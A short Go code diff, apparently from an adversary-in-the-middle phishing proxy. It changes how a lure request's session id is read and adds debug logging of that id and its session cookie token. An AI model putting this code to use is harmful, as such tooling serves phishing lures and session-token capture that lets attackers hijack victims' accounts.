@@ -548,7 +548,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
-						sid := req.URL.RawQuery
+						sid := req.URL.Query().Get("sid")
+						if sid != "" {
+							log.Debug("sid: %s", sid)
+							log.Debug("cookietoken: %s", p.getSessionCookieToken(sid))
+						}
 						log.Debug("sid: %s", sid)
 					}
 				}
